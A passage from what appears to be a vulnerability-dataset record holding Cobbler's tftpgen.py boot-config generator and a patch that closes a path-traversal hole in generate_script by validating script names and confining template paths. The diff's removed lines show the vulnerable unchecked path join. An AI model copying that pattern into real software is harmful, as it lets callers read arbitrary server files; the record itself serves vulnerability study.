\"grub\".\n\n        :param filename: If present this writes the output into the giving filename. If not present this method just\n                         returns the generated configuration.\n        :param system: If you supply a system there are other templates used then when using only a profile/image/\n                       distro.\n        :param profile: The profile to generate the pxe-file for.\n        :param distro: If you don't ship an image, this is needed. Otherwise this just supplies information needed for\n                       the templates.\n        :param arch: The processor architecture to generate the pxefile for.\n        :param image: If you want to be able to deploy an image, supply this parameter.\n        :param metadata: Pass additional parameters to the ones being collected during the method.\n        :param format: Can be any of those returned by utils.get_supported_system_boot_loaders().\n        :return: The generated filecontent for the required item.\n        \"\"\"\n\n        if arch is None:\n            raise CX(\"missing arch\")\n\n        if image and not os.path.exists(image.file):\n            return None  # nfs:// URLs or something, can't use for TFTP\n\n        if metadata is None:\n            metadata = {}\n\n        boot_loaders = None\n        if system:\n            boot_loaders = system.boot_loaders\n            metadata[\"menu_label\"] = system.name\n            metadata[\"menu_name\"] = system.name\n        elif profile:\n            boot_loaders = profile.boot_loaders\n            metadata[\"menu_label\"] = profile.name\n            metadata[\"menu_name\"] = profile.name\n        elif image:\n            boot_loaders = image.boot_loaders\n            metadata[\"menu_label\"] = image.name\n            metadata[\"menu_name\"] = image.name\n        if boot_loaders is None or format not in boot_loaders:\n            return None\n\n        (rval, settings) = utils.input_string_or_dict(self.settings.to_dict())\n        if rval:\n            for key in list(settings.keys()):\n                metadata[key] = settings[key]\n        # ---\n        # just some random variables\n        buffer = \"\"\n\n        template = os.path.join(self.settings.boot_loader_conf_template_dir, format + \".template\")\n        self.build_kernel(metadata, system, profile, distro, image, format)\n\n        # generate the kernel options and append line:\n        kernel_options = self.build_kernel_options(system, profile, distro,\n                                                   image, arch.value, metadata[\"autoinstall\"])\n        metadata[\"kernel_options\"] = kernel_options\n\n        if distro and distro.os_version.startswith(\"esxi\") and filename is not None:\n            append_line = \"BOOTIF=%s\" % (os.path.basename(filename))\n        else:\n            append_line = \"append \"\n        append_line = \"%s%s\" % (append_line, kernel_options)\n        if distro and distro.os_version.startswith(\"xenserver620\"):\n            append_line = \"%s\" % (kernel_options)\n        metadata[\"append_line\"] = append_line\n\n        # store variables for templating\n        if system:\n            if system.serial_device or system.serial_baud_rate:\n                if system.serial_device:\n                    serial_device = system.serial_device\n                else:\n                    serial_device = 0\n                if system.serial_baud_rate:\n                    serial_baud_rate = system.serial_baud_rate.value\n                else:\n                    serial_baud_rate = 115200\n\n                if format == \"pxe\":\n                    buffer += \"serial %d %d\\n\" % (serial_device, serial_baud_rate)\n                elif format == \"grub\":\n                    buffer += \"set serial_console=true\\nset serial_baud={baud}\\nset serial_line={device}\\n\" \\\n                        .format(baud=serial_baud_rate, device=serial_device)\n\n        # get the template\n        if metadata[\"kernel_path\"] is not None:\n            template_fh = open(template)\n            template_data = template_fh.read()\n            template_fh.close()\n        else:\n            # this is something we can't PXE boot\n            template_data = \"\\n\"\n\n        # save file and/or return results, depending on how called.\n        buffer += self.templar.render(template_data, metadata, None)\n\n        if filename is not None:\n            self.logger.info(\"generating: %s\", filename)\n            # Ensure destination path exists to avoid race condition\n            if not os.path.exists(os.path.dirname(filename)):\n                utils.mkdir(os.path.dirname(filename))\n            with open(filename, \"w\") as fd:\n                fd.write(buffer)\n        return buffer\n\n    def build_kernel(self, metadata, system, profile, distro, image=None, boot_loader: str = \"pxe\"):\n        \"\"\"\n        Generates kernel and initrd metadata.\n\n        :param metadata: Pass additional parameters to the ones being collected during the method.\n        :param profile: The profile to generate the pxe-file for.\n        :param distro: If you don't ship an image, this is needed. Otherwise this just supplies information needed for\n                       the templates.\n        :param image: If you want to be able to deploy an image, supply this parameter.\n        :param boot_loader: Can be any of those returned by utils.get_supported_system_boot_loaders().\n        \"\"\"\n        kernel_path = None\n        initrd_path = None\n        img_path = None\n\n        # ---\n\n        if system:\n            blended = utils.blender(self.api, True, system)\n            meta_blended = utils.blender(self.api, False, system)\n        elif profile:\n            blended = utils.blender(self.api, True, profile)\n            meta_blended = utils.blender(self.api, False, profile)\n        elif image:\n            blended = utils.blender(self.api, True, image)\n            meta_blended = utils.blender(self.api, False, image)\n        else:\n            blended = {}\n            meta_blended = {}\n\n        autoinstall_meta = meta_blended.get(\"autoinstall_meta\", {})\n        metadata.update(blended)\n\n        if image is None:\n            # not image based, it's something normalish\n            img_path = os.path.join(\"/images\", distro.name)\n            if boot_loader in [\"grub\", \"ipxe\"]:\n                if distro.remote_grub_kernel:\n                    kernel_path = distro.remote_grub_kernel\n                if distro.remote_grub_initrd:\n                    initrd_path = distro.remote_grub_initrd\n\n            if 'http' in distro.kernel and 'http' in distro.initrd:\n                if not kernel_path:\n                    kernel_path = distro.kernel\n                if not initrd_path:\n                    initrd_path = distro.initrd\n\n            if not kernel_path:\n                kernel_path = os.path.join(img_path, os.path.basename(distro.kernel))\n            if not initrd_path:\n                initrd_path = os.path.join(img_path, os.path.basename(distro.initrd))\n        else:\n            # this is an image we are making available, not kernel+initrd\n            if image.image_type == \"direct\":\n                kernel_path = os.path.join(\"/images2\", image.name)\n            elif image.image_type == \"memdisk\":\n                kernel_path = \"/memdisk\"\n                initrd_path = os.path.join(\"/images2\", image.name)\n            else:\n                # CD-ROM ISO or virt-clone image? We can't PXE boot it.\n                kernel_path = None\n                initrd_path = None\n\n        if \"img_path\" not in metadata:\n            metadata[\"img_path\"] = img_path\n        if \"kernel_path\" not in metadata:\n            metadata[\"kernel_path\"] = kernel_path\n        if \"initrd_path\" not in metadata:\n            metadata[\"initrd_path\"] = initrd_path\n\n        if \"kernel\" in autoinstall_meta:\n            kernel_path = autoinstall_meta[\"kernel\"]\n\n            if not utils.file_is_remote(kernel_path):\n                kernel_path = os.path.join(img_path, os.path.basename(kernel_path))\n            metadata[\"kernel_path\"] = kernel_path\n\n        metadata[\"initrd\"] = self._generate_initrd(autoinstall_meta, kernel_path, initrd_path, boot_loader)\n\n    def build_kernel_options(self, system, profile, distro, image, arch: str, autoinstall_path) -> str:\n        \"\"\"\n        Builds the full kernel options line.\n\n        :param system: The system to generate the kernel options for.\n        :param profile: Although the system contains the profile please specify it explicitly here.\n        :param distro: Although the profile contains the distribution please specify it explicitly here.\n        :param image: The image to generate the kernel options for.\n        :param arch: The processor architecture to generate the kernel options for.\n        :param autoinstall_path: The autoinstallation path. Normally this will be a URL because you want to pass a link\n                                 to an autoyast, preseed or kickstart file.\n        :return: The generated kernel line options.\n        \"\"\"\n\n        management_interface = None\n        management_mac = None\n        if system is not None:\n            blended = utils.blender(self.api, False, system)\n            # find the first management interface\n            try:\n                for intf in list(system.interfaces.keys()):\n                    if system.interfaces[intf][\"management\"]:\n                        management_interface = intf\n                        if system.interfaces[intf][\"mac_address\"]:\n                            management_mac = system.interfaces[intf][\"mac_address\"]\n                        break\n            except:\n                # just skip this then\n                pass\n        elif profile is not None:\n            blended = utils.blender(self.api, False, profile)\n        else:\n            blended = utils.blender(self.api, False, image)\n\n        append_line = \"\"\n        kopts = blended.get(\"kernel_options\", dict())\n        kopts = utils.revert_strip_none(kopts)\n\n        # SUSE and other distro specific kernel additions or modifications\n        if distro is not None:\n            if system is None:\n                utils.kopts_overwrite(kopts, self.settings.server, distro.breed)\n            else:\n                utils.kopts_overwrite(kopts, self.settings.server, distro.breed, system.name)\n\n        # support additional initrd= entries in kernel options.\n        if \"initrd\" in kopts:\n            append_line = \",%s\" % kopts.pop(\"initrd\")\n        hkopts = utils.dict_to_string(kopts)\n        append_line = \"%s %s\" % (append_line, hkopts)\n\n        # automatic installation file path rewriting (get URLs for local files)\n        if autoinstall_path:\n\n            # FIXME: need to make shorter rewrite rules for these URLs\n\n            # changing http_server's server component to its IP address was intruduced with\n            # https://github.com/cobbler/cobbler/commit/588756aa7aefc122310847d007becf3112647944\n            # to shorten the message length for S390 systems.\n            # On multi-homed cobbler servers, this can lead to serious problems when installing\n            # systems in a dedicated isolated installation subnet:\n            # - typically, $server is reachable by name (DNS resolution assumed) both during PXE\n            #   install and during production, but via different IP addresses\n            # - $http_server is explicitly constructed from $server\n            # - the IP address for $server may resolv differently between cobbler server (production)\n            #   and installing system\n            # - using IP($http_server) below may need to set $server in a way that matches the installation\n            #   network\n            # - using $server for later repository access then will fail, because the installation address\n            #   isn't reachable for production systems\n            #\n            # In order to make the revert less intrusive, it'll depend on a configuration setting\n            if self.settings and self.settings.convert_server_to_ip:\n                try:\n                    httpserveraddress = socket.gethostbyname_ex(blended[\"http_server\"])[2][0]\n                except socket.gaierror:\n                    httpserveraddress = blended[\"http_server\"]\n            else:\n                httpserveraddress = blended[\"http_server\"]\n\n            URL_REGEX = \"[a-zA-Z]*://.*\"\n            local_autoinstall_file = not re.match(URL_REGEX, autoinstall_path)\n            if local_autoinstall_file:\n                if system is not None:\n                    autoinstall_path = \"http://%s/cblr/svc/op/autoinstall/system/%s\" % (httpserveraddress, system.name)\n                else:\n                    autoinstall_path = \"http://%s/cblr/svc/op/autoinstall/profile/%s\" \\\n                                       % (httpserveraddress, profile.name)\n\n            if distro.breed is None or distro.breed == \"redhat\":\n\n                append_line += \" kssendmac\"\n                append_line = \"%s inst.ks=%s\" % (append_line, autoinstall_path)\n                ipxe = blended[\"enable_ipxe\"]\n                if ipxe:\n                    append_line = append_line.replace('ksdevice=bootif', 'ksdevice=${net0/mac}')\n            elif distro.breed == \"suse\":\n                append_line = \"%s autoyast=%s\" % (append_line, autoinstall_path)\n                if management_mac and distro.arch not in (enums.Archs.S390, enums.Archs.S390X):\n                    append_line += \" netdevice=%s\" % management_mac\n            elif distro.breed == \"debian\" or distro.breed == \"ubuntu\":\n                append_line = \"%s auto-install/enable=true priority=critical netcfg/choose_interface=auto url=%s\" \\\n                              % (append_line, autoinstall_path)\n                if management_interface:\n                    append_line += \" netcfg/choose_interface=%s\" % management_interface\n            elif distro.breed == \"freebsd\":\n                append_line = \"%s ks=%s\" % (append_line, autoinstall_path)\n\n                # rework kernel options for debian distros\n                translations = {'ksdevice': \"interface\", 'lang': \"locale\"}\n                for k, v in list(translations.items()):\n                    append_line = append_line.replace(\"%s=\" % k, \"%s=\" % v)\n\n                # interface=bootif causes a failure\n                append_line = append_line.replace(\"interface=bootif\", \"\")\n            elif distro.breed == \"vmware\":\n                if distro.os_version.find(\"esxi\") != -1:\n                    # ESXi is very picky, it's easier just to redo the\n                    # entire append line here since\n                    append_line = \" ks=%s %s\" % (autoinstall_path, hkopts)\n                    # ESXi likes even fewer options, so we remove them too\n                    append_line = append_line.replace(\"kssendmac\", \"\")\n                else:\n                    append_line = \"%s vmkopts=debugLogToSerial:1 mem=512M ks=%s\" % \\\n                                  (append_line, autoinstall_path)\n                # interface=bootif causes a failure\n                append_line = append_line.replace(\"ksdevice=bootif\", \"\")\n            elif distro.breed == \"xen\":\n                if distro.os_version.find(\"xenserver620\") != -1:\n                    img_path = os.path.join(\"/images\", distro.name)\n                    append_line = \"append %s/xen.gz dom0_max_vcpus=2 dom0_mem=752M com1=115200,8n1 console=com1,\" \\\n                                  \"vga --- %s/vmlinuz xencons=hvc console=hvc0 console=tty0 install answerfile=%s ---\" \\\n                                  \" %s/install.img\" % (img_path, img_path, autoinstall_path, img_path)\n                    return append_line\n            elif distro.breed == \"powerkvm\":\n                append_line += \" kssendmac\"\n                append_line = \"%s kvmp.inst.auto=%s\" % (append_line, autoinstall_path)\n\n        if distro is not None and (distro.breed in [\"debian\", \"ubuntu\"]):\n            # Hostname is required as a parameter, the one in the preseed is not respected, so calculate if we have one\n            # here.\n            # We're trying: first part of FQDN in hostname field, then system name, then profile name.\n            # In Ubuntu, this is at least used for the volume group name when using LVM.\n            domain = \"local.lan\"\n            if system is not None:\n                if system.hostname is not None and system.hostname != \"\":\n                    # If this is a FQDN, grab the first bit\n                    hostname = system.hostname.split(\".\")[0]\n                    _domain = system.hostname.split(\".\")[1:]\n                    if _domain:\n                        domain = \".\".join(_domain)\n                else:\n                    hostname = system.name\n            else:\n                # ubuntu at the very least does not like having underscores\n                # in the hostname.\n                # FIXME: Really this should remove all characters that are\n                # forbidden in hostnames\n                hostname = profile.name.replace(\"_\", \"\")\n\n            # At least for debian deployments configured for DHCP networking this values are not used, but specifying\n            # here avoids questions\n            append_line = \"%s hostname=%s\" % (append_line, hostname)\n            append_line = \"%s domain=%s\" % (append_line, domain)\n\n            # A similar issue exists with suite name, as installer requires the existence of \"stable\" in the dists\n            # directory\n            append_line = \"%s suite=%s\" % (append_line, distro.os_version)\n\n        # append necessary kernel args for arm architectures\n        if arch is enums.Archs.ARM:\n            append_line = \"%s fixrtc vram=48M omapfb.vram=0:24M\" % append_line\n\n        # do variable substitution on the append line\n        # promote all of the autoinstall_meta variables\n        if \"autoinstall_meta\" in blended:\n            blended.update(blended[\"autoinstall_meta\"])\n        append_line = self.templar.render(append_line, utils.flatten(blended), None)\n\n        # For now console=ttySx,BAUDRATE are only set for systems\n        # This could get enhanced for profile/distro via utils.blender (inheritance)\n        # This also is architecture specific. E.g: Some ARM consoles need: console=ttyAMAx,BAUDRATE\n        # I guess we need a serial_kernel_dev = param, that can be set to \"ttyAMA\" if needed.\n        if system and arch == Archs.X86_64:\n            if system.serial_device or system.serial_baud_rate:\n                if system.serial_device:\n                    serial_device = system.serial_device\n                else:\n                    serial_device = 0\n                if system.serial_baud_rate:\n                    serial_baud_rate = system.serial_baud_rate.value\n                else:\n                    serial_baud_rate = 115200\n\n                append_line = \"%s console=ttyS%s,%s\" % (append_line, serial_device, serial_baud_rate)\n\n        # FIXME - the append_line length limit is architecture specific\n        if len(append_line) >= 1023:\n            self.logger.warning(\"warning: kernel option length exceeds 1023\")\n\n        return append_line\n\n    def write_templates(self, obj, write_file: bool = False, path=None) -> Dict[str, str]:\n        \"\"\"\n        A semi-generic function that will take an object with a template_files dict {source:destiation}, and generate a\n        rendered file. The write_file option allows for generating of the rendered output without actually creating any\n        files.\n\n        :param obj: The object to write the template files for.\n        :param write_file: If the generated template should be written to the disk.\n        :param path: TODO: A useless parameter?\n        :return: A dict of the destination file names (after variable substitution is done) and the data in the file.\n        \"\"\"\n        self.logger.info(\"Writing template files for %s\", obj.name)\n\n        results = {}\n\n        try:\n            templates = obj.template_files\n        except:\n            return results\n\n        blended = utils.blender(self.api, False, obj)\n\n        if obj.COLLECTION_TYPE == \"distro\":\n            if re.search(\"esxi[567]\", obj.os_version) is not None:\n                realbootcfg = open(os.path.join(os.path.dirname(obj.kernel), 'boot.cfg')).read()\n                bootmodules = re.findall(r'modules=(.*)', realbootcfg)\n                for modules in bootmodules:\n                    blended['esx_modules'] = modules.replace('/', '')\n\n        autoinstall_meta = blended.get(\"autoinstall_meta\", {})\n        try:\n            del blended[\"autoinstall_meta\"]\n        except:\n            pass\n        blended.update(autoinstall_meta)  # make available at top level\n\n        templates = blended.get(\"template_files\", {})\n        try:\n            del blended[\"template_files\"]\n        except:\n            pass\n        blended.update(templates)  # make available at top level\n\n        (success, templates) = utils.input_string_or_dict(templates)\n\n        if not success:\n            return results\n\n        # FIXME: img_path and local_img_path should probably be moved up into the blender function to ensure they're\n        #  consistently available to templates across the board.\n        if blended[\"distro_name\"]:\n            blended['img_path'] = os.path.join(\"/images\", blended[\"distro_name\"])\n            blended['local_img_path'] = os.path.join(self.bootloc, \"images\", blended[\"distro_name\"])\n\n        for template in list(templates.keys()):\n            dest = templates[template]\n            if dest is None:\n                continue\n\n            # Run the source and destination files through templar first to allow for variables in the path\n            template = self.templar.render(template, blended, None).strip()\n            dest = os.path.normpath(self.templar.render(dest, blended, None).strip())\n            # Get the path for the destination output\n            dest_dir = os.path.normpath(os.path.dirname(dest))\n\n            # If we're looking for a single template, skip if this ones destination is not it.\n            if path is not None and path != dest:\n                continue\n\n            # If we are writing output to a file, we allow files tobe written into the tftpboot directory, otherwise\n            # force all templated configs into the rendered directory to ensure that a user granted cobbler privileges\n            # via sudo can't overwrite arbitrary system files (This also makes cleanup easier).\n            if os.path.isabs(dest_dir) and write_file:\n                if dest_dir.find(self.bootloc) != 0:\n                    raise CX(\" warning: template destination (%s) is outside %s, skipping.\" % (dest_dir, self.bootloc))\n            elif write_file:\n                dest_dir = os.path.join(self.settings.webdir, \"rendered\", dest_dir)\n                dest = os.path.join(dest_dir, os.path.basename(dest))\n                if not os.path.exists(dest_dir):\n                    utils.mkdir(dest_dir)\n\n            # Check for problems\n            if not os.path.exists(template):\n                raise CX(\"template source %s does not exist\" % template)\n            elif write_file and not os.path.isdir(dest_dir):\n                raise CX(\"template destination (%s) is invalid\" % dest_dir)\n            elif write_file and os.path.exists(dest):\n                raise CX(\"template destination (%s) already exists\" % dest)\n            elif write_file and os.path.isdir(dest):\n                raise CX(\"template destination (%s) is a directory\" % dest)\n            elif template == \"\" or dest == \"\":\n                raise CX(\"either the template source or destination was blank (unknown variable used?)\")\n\n            template_fh = open(template)\n            template_data = template_fh.read()\n            template_fh.close()\n\n            buffer = self.templar.render(template_data, blended, None)\n            results[dest] = buffer\n\n            if write_file:\n                self.logger.info(\"generating: %s\", dest)\n                fd = open(dest, \"w\")\n                fd.write(buffer)\n                fd.close()\n\n        return results\n\n    def generate_ipxe(self, what: str, name: str) -> str:\n        \"\"\"\n        Generate the ipxe files.\n\n        :param what: Either \"profile\" or \"system\". All other item types not valid.\n        :param name: The name of the profile or system.\n        :return: The rendered template.\n        \"\"\"\n        if what.lower() not in (\"profile\", \"image\", \"system\"):\n            return \"# ipxe is only valid for profiles, images and systems\"\n\n        distro = None\n        image = None\n        profile = None\n        system = None\n        if what == \"profile\":\n            profile = self.api.find_profile(name=name)\n            if profile:\n                distro = profile.get_conceptual_parent()\n        elif what == \"image\":\n            image = self.api.find_image(name=name)\n        else:\n            system = self.api.find_system(name=name)\n            if system:\n                profile = system.get_conceptual_parent()\n            if profile and profile.COLLECTION_TYPE == \"profile\":\n                distro = profile.get_conceptual_parent()\n            else:\n                image = profile\n                profile = None\n\n        if distro:\n            arch = distro.arch\n        elif image:\n            arch = image.arch\n        else:\n            return \"\"\n\n        result = self.write_pxe_file(None, system, profile, distro, arch, image, format='ipxe')\n        return \"\" if not result else result\n\n    def generate_bootcfg(self, what: str, name: str) -> str:\n        \"\"\"\n        Generate a bootcfg for a system of profile.\n\n        :param what: The type for what the bootcfg is generated for. Must be \"profile\" or \"system\".\n        :param name: The name of the item which the bootcfg should be generated for.\n        :return: The fully rendered bootcfg as a string.\n        \"\"\"\n        if what.lower() not in (\"profile\", \"system\"):\n            return \"# bootcfg is only valid for profiles and systems\"\n\n        if what == \"profile\":\n            obj = self.api.find_profile(name=name)\n            distro = obj.get_conceptual_parent()\n        else:\n            obj = self.api.find_system(name=name)\n            distro = obj.get_conceptual_parent().get_conceptual_parent()\n\n        # For multi-arch distros, the distro name in distro_mirror may not contain the arch string, so we need to figure\n        # out the path based on where the kernel is stored. We do this because some distros base future downloads on the\n        # initial URL passed in, so all of the files need to be at this location (which is why we can't use the images\n        # link, which just contains the kernel and initrd).\n        distro_mirror_name = ''.join(distro.kernel.split('/')[-2:-1])\n\n        blended = utils.blender(self.api, False, obj)\n\n        if distro.os_version.startswith(\"esxi\"):\n            with open(os.path.join(os.path.dirname(distro.kernel), 'boot.cfg')) as f:\n                bootmodules = re.findall(r'modules=(.*)', f.read())\n                for modules in bootmodules:\n                    blended['esx_modules'] = modules.replace('/', '')\n\n        autoinstall_meta = blended.get(\"autoinstall_meta\", {})\n        try:\n            del blended[\"autoinstall_meta\"]\n        except:\n            pass\n        blended.update(autoinstall_meta)  # make available at top level\n\n        blended['distro'] = distro_mirror_name\n\n        # FIXME: img_path should probably be moved up into the blender function to ensure they're consistently\n        #        available to templates across the board\n        if obj.enable_ipxe:\n            blended['img_path'] = 'http://%s:%s/cobbler/links/%s' % (self.settings.server, self.settings.http_port,\n                                                                     distro.name)\n        else:\n            blended['img_path'] = os.path.join(\"/images\", distro.name)\n\n        template = os.path.join(self.settings.boot_loader_conf_template_dir, \"bootcfg.template\")\n        if not os.path.exists(template):\n            return \"# boot.cfg template not found for the %s named %s (filename=%s)\" % (what, name, template)\n\n        template_fh = open(template)\n        template_data = template_fh.read()\n        template_fh.close()\n\n        return self.templar.render(template_data, blended, None)\n\n    def generate_script(self, what: str, objname: str, script_name: str) -> str:\n        \"\"\"\n        Generate a script from a autoinstall script template for a given profile or system.\n\n        :param what: The type for what the bootcfg is generated for. Must be \"profile\" or \"system\".\n        :param objname: The name of the item which the bootcfg should be generated for.\n        :param script_name: The name of the template which should be rendered for the system or profile.\n        :return: The fully rendered script as a string.\n        \"\"\"\n        if what == \"profile\":\n            obj = self.api.find_profile(name=objname)\n        elif what == \"system\":\n            obj = self.api.find_system(name=objname)\n        else:\n            raise ValueError(\"\\\"what\\\" needs to be either \\\"profile\\\" or \\\"system\\\"!\")\n\n        if not validate_autoinstall_script_name(script_name):\n            raise ValueError(\"\\\"script_name\\\" handed to generate_script was not valid!\")\n\n        if not obj:\n            return \"# \\\"%s\\\" named \\\"%s\\\" not found\" % (what, objname)\n\n        distro = obj.get_conceptual_parent()\n        while distro.get_conceptual_parent():\n            distro = distro.get_conceptual_parent()\n\n        blended = utils.blender(self.api, False, obj)\n\n        autoinstall_meta = blended.get(\"autoinstall_meta\", {})\n        try:\n            del blended[\"autoinstall_meta\"]\n        except:\n            pass\n        blended.update(autoinstall_meta)  # make available at top level\n\n        # FIXME: img_path should probably be moved up into the blender function to ensure they're consistently\n        #        available to templates across the board\n        if obj.enable_ipxe:\n            blended['img_path'] = 'http://%s:%s/cobbler/links/%s' % (self.settings.server, self.settings.http_port,\n                                                                     distro.name)\n        else:\n            blended['img_path'] = os.path.join(\"/images\", distro.name)\n\n        scripts_root = \"/var/lib/cobbler/scripts\"\n        template = os.path.normpath(os.path.join(scripts_root, script_name))\n        if not template.startswith(scripts_root):\n            return \"# script template \\\"%s\\\" could not be found in the script root\" % script_name\n        if not os.path.exists(template):\n            return \"# script template \\\"%s\\\" not found\" % script_name\n\n        with open(template) as template_fh:\n            template_data = template_fh.read()\n\n        return self.templar.render(template_data, blended, None)\n\n    def _build_windows_initrd(self, loader_name: str, custom_loader_name: str, format: str) -> str:\n        \"\"\"\n        Generate a initrd metadata for Windows.\n\n        :param loader_name: The loader name.\n        :param custom_loader_name: The loader name in profile or system.\n        :param format: Can be any of those returned by get_supported_system_boot_loaders.\n        :return: The fully generated initrd string for the boot loader.\n        \"\"\"\n        initrd_line = custom_loader_name\n\n        if format == \"ipxe\":\n            initrd_line = \"--name \" + loader_name + \" \" + custom_loader_name + \" \" + loader_name\n\n        return initrd_line\n\n    def _generate_initrd(self, autoinstall_meta: dict, kernel_path, initrd_path, format: str) -> List[str]:\n        \"\"\"\n        Generate a initrd metadata.\n\n        :param autoinstall_meta: The kernel options.\n        :param kernel_path: Path to the kernel.\n        :param initrd_path: Path to the initrd.\n        :param format: Can be any of those returned by get_supported_system_boot_loaders.\n        :return: The array of additional boot load files.\n        \"\"\"\n        initrd = []\n        if \"initrd\" in autoinstall_meta:\n            initrd = autoinstall_meta[\"initrd\"]\n\n        if kernel_path and \"wimboot\" in kernel_path:\n            remote_boot_files = utils.file_is_remote(kernel_path)\n\n            if remote_boot_files:\n                loaders_path = 'http://@@http_server@@/cobbler/images/@@distro_name@@/'\n                initrd_path = loaders_path + os.path.basename(initrd_path)\n            else:\n                (loaders_path, kernel_name) = os.path.split(kernel_path)\n                loaders_path += '/'\n\n            bootmgr_path = bcd_path = wim_path = loaders_path\n\n            if initrd_path:\n                initrd.append(self._build_windows_initrd(\"boot.sdi\", initrd_path, format))\n            if \"bootmgr\" in autoinstall_meta:\n                initrd.append(self._build_windows_initrd(\"bootmgr.exe\", bootmgr_path + autoinstall_meta[\"bootmgr\"],\n                                                         format))\n            if \"bcd\" in autoinstall_meta:\n                initrd.append(self._build_windows_initrd(\"bcd\", bcd_path + autoinstall_meta[\"bcd\"], format))\n            if \"winpe\" in autoinstall_meta:\n                initrd.append(self._build_windows_initrd(\"winpe.wim\", wim_path + autoinstall_meta[\"winpe\"], format))\n        else:\n            if initrd_path:\n                initrd.append(initrd_path)\n\n        return initrd\n", "patch": "@@ -25,12 +25,12 @@\n import os.path\n import re\n import socket\n-from typing import Dict, Optional, List\n+from typing import Dict, List, Optional\n \n-from cobbler import enums, templar\n-from cobbler import utils\n+from cobbler import enums, templar, utils\n from cobbler.cexceptions import CX\n from cobbler.enums import Archs\n+from cobbler.validate import validate_autoinstall_script_name\n \n \n class TFTPGen:\n@@ -1196,11 +1196,16 @@ def generate_script(self, what: str, objname: str, script_name: str) -> str:\n         \"\"\"\n         if what == \"profile\":\n             obj = self.api.find_profile(name=objname)\n-        else:\n+        elif what == \"system\":\n             obj = self.api.find_system(name=objname)\n+        else:\n+            raise ValueError(\"\\\"what\\\" needs to be either \\\"profile\\\" or \\\"system\\\"!\")\n+\n+        if not validate_autoinstall_script_name(script_name):\n+            raise ValueError(\"\\\"script_name\\\" handed to generate_script was not valid!\")\n \n         if not obj:\n-            return \"# %s named %s not found\" % (what, objname)\n+            return \"# \\\"%s\\\" named \\\"%s\\\" not found\" % (what, objname)\n \n         distro = obj.get_conceptual_parent()\n         while distro.get_conceptual_parent():\n@@ -1223,13 +1228,15 @@ def generate_script(self, what: str, objname: str, script_name: str) -> str:\n         else:\n             blended['img_path'] = os.path.join(\"/images\", distro.name)\n \n-        template = os.path.normpath(os.path.join(\"/var/lib/cobbler/scripts\", script_name))\n+        scripts_root = \"/var/lib/cobbler/scripts\"\n+        template = os.path.normpath(os.path.join(scripts_root, script_name))\n+        if not template.startswith(scripts_root):\n+            return \"# script template \\\"%s\\\" could not be found in the script root\" % script_name\n         if not os.path.exists(template):\n-            return \"# script template %s not found\" % script_name\n+            return \"# script template \\\"%s\\\" not found\" % script_name\n \n-        template_fh = open(template)\n-        template_data = template_fh.read()\n-        template_fh.close()\n+        with open(template) as template_fh:\n+            template_data = template_fh.read()\n \n         return self.templar.render(template_data, blended, None)\n ", "file_path": "files/2021_10/1107", "file_language": "py", "file_name": "cobbler/tftpgen.py", "outdated_file_modify": 0, "outdated_file_before": 0, "outdated_file_after": 0, "llm_check": 1, "static_check": 0, "static": {"rats": [false, []], "semgrep": [false, []]}, "target": -1, "function_before": [], "function_after": []}, {"raw_url": "https://github.com/cobbler/cobbler/raw/d8f60bbf14a838c8c8a1dba98086b223e35fe70a/cobbler%2Fvalidate.py", "code": "\"\"\"\nCopyright 2014-2015. Jorgen Maas <jorgen.maas@gmail.com>\n\nThis program is free software; you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation; either version 2 of the License, or\n(at your option) any later version.\n\nThis program is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nGNU General Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with this program; if not, write to the Free Software\nFoundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA\n02110-1301  USA\n\"\"\"\n\nimport re\nimport shlex\nfrom urllib.parse import urlparse\nfrom ipaddress import AddressValueError, NetmaskValueError\nfrom typing import Union\nfrom uuid import UUID\n\nimport netaddr\n\nfrom cobbler import enums, utils\nfrom cobbler.items import item\n\nRE_HOSTNAME = re.compile(r'^([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])(\\.([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9]))*$')\nRE_URL_GRUB = re.compile(r\"^\\((?P<protocol>http|tftp),(?P<server>.*)\\)/(?P<path>.*)$\")\nRE_URL = re.compile(r'^[a-zA-Z\\d-]{,63}(\\.[a-zA-Z\\d-]{,63})*$')  # https://stackoverflow.com/a/2894918\nRE_SCRIPT_NAME = re.compile(r\"[a-zA-Z0-9_\\-.]+\")\n\n# blacklist invalid values to the repo statement in autoinsts\nAUTOINSTALL_REPO_BLACKLIST = ['enabled', 'gpgcheck', 'gpgkey']\n\n\n# FIXME: Allow the <<inherit>> magic string to be parsed correctly.\n\n\ndef hostname(dnsname: str) -> str:\n    \"\"\"\n    Validate the DNS name.\n\n    :param dnsname: Hostname or FQDN\n    :returns: Hostname or FQDN\n    :raises TypeError: If the Hostname/FQDN is not a string or in an invalid format.\n    \"\"\"\n    if not isinstance(dnsname, str):\n        raise TypeError(\"Invalid input, dnsname must be a string\")\n    else:\n        dnsname = dnsname.strip()\n\n    if dnsname == \"\":\n        # hostname is not required\n        return dnsname\n\n    if not RE_HOSTNAME.match(dnsname):\n        raise ValueError(\"Invalid hostname format (%s)\" % dnsname)\n\n    return dnsname\n\n\ndef mac_address(mac: str, for_item=True) -> str:\n    \"\"\"\n    Validate as an Ethernet MAC address.\n\n    :param mac: MAC address\n    :param for_item: If the check should be performed for an item or not.\n    :returns: MAC address\n    :raises ValueError: Raised in case ``mac`` has an invalid format.\n    :raises TypeError: Raised in case ``mac`` is not a string.\n    \"\"\"\n    if not isinstance(mac, str):\n        raise TypeError(\"Invalid input, mac must be a string\")\n    mac = mac.lower().strip()\n\n    if for_item is True:\n        # this value has special meaning for items\n        if mac == \"random\":\n            return mac\n\n        # copying system collection will set mac to \"\"\n        # netaddr will fail to validate this mac and throws an exception\n        if mac == \"\":\n            return mac\n\n    if not netaddr.valid_mac(mac):\n        raise ValueError(\"Invalid mac address format (%s)\" % mac)\n\n    return mac\n\n\ndef ipv4_address(addr: str) -> str:\n    \"\"\"\n    Validate an IPv4 address.\n\n    :param addr: IPv4 address\n    :returns: IPv4 address\n    :raises TypeError: Raised if ``addr`` is not a string.\n    :raises AddressValueError: Raised in case ``addr`` is not a valid IPv4 address.\n    :raises NetmaskValueError: Raised in case ``addr`` is not a valid IPv4 netmask.\n    \"\"\"\n    if not isinstance(addr, str):\n       